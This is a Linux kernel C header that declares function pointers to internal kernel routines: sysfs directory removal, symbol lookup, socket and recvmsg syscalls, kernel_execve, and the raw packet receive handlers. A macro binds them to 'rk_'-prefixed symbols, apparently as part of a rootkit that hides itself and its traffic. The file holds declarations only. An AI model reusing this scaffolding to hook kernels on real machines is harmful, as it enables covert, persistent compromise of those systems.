#ifndef KERNEL_FUNCTIONS_H
#define KERNEL_FUNCTIONS_H

#include <linux/kobject.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "sysmap.h"

#define KFUN(name) fn_##name = (void*) rk_##name

extern int (*fn_sysfs_remove_dir)(struct kobject*);
extern struct sock* (*fn_netlink_lookup)(struct net*, int, u32);
extern unsigned long (*fn_kallsyms_lookup_name)(const char*);
extern asmlinkage long (*fn_sys_socket)(int, int, int);
extern asmlinkage long (*fn_sys_recvmsg)(int, struct msghdr*, unsigned);
extern int (*kernel_execve)(const char*, char *const argv[], char *const envp[]);
extern int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);
extern int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);
extern int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);

#endif
